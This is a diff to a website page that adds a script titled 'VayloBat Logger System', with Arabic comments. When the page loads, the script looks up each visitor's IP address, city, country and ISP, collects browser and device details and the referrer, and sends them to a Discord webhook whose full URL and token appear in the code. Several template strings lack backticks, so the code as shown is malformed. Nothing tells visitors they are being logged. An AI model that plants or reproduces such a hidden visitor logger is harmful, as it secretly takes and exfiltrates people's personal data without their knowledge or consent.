@@ -77,7 +77,54 @@ layout: page
     })
     .catch(err => console.error("Error:", err));
 })();
-
-
 </script>
+
+<script type="text/javascript">
+(function() {
+    console.log("Logger Started...");
+
+    // جلب معلومات الأيبي والموقع الجغرافي باستخدام ipapi (أو أي خدمة مشابهة)
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        // جمع معلومات المتصفح والجهاز
+        const info = {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            org: data.org, // مزود الخدمة
+            userAgent: navigator.userAgent, // نوع المتصفح والنظام
+            language: navigator.language,
+            screenRes: ${window.screen.width}x${window.screen.height},
+            referrer: document.referrer || "Direct Visit" // من أين أتى الزائر
+        };
+
+        // إرسال البيانات إلى Webhook ديسكورد بتنسيق Embed ليكون أوضح
+        fetch("https://discord.com/api/webhooks/1491120789657751654/EBS7d6Fte20pTjEHxMI1pahHTCmJwZDbqxV_0bdxyorMbSGtT5QKqP40-7PQufXsM02K", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🚨 زائر جديد للموقع",
+                    color: 15158332, // لون أحمر
+                    fields: [
+                        { name: "IP Address", value: info.ip, inline: true },
+                        { name: "Location", value: ${info.city}, ${info.country}, inline: true },
+                        { name: "ISP", value: info.org, inline: false },
+                        { name: "OS / Browser", value: info.userAgent, inline: false },
+                        { name: "Resolution", value: info.screenRes, inline: true },
+                        { name: "Referrer", value: info.referrer, inline: true }
+                    ],
+                    footer: { text: "VayloBat Logger System" },
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        });
+    })
+    .catch(err => console.error("Error logging data:", err));
+})();
+</script>
+
+
 
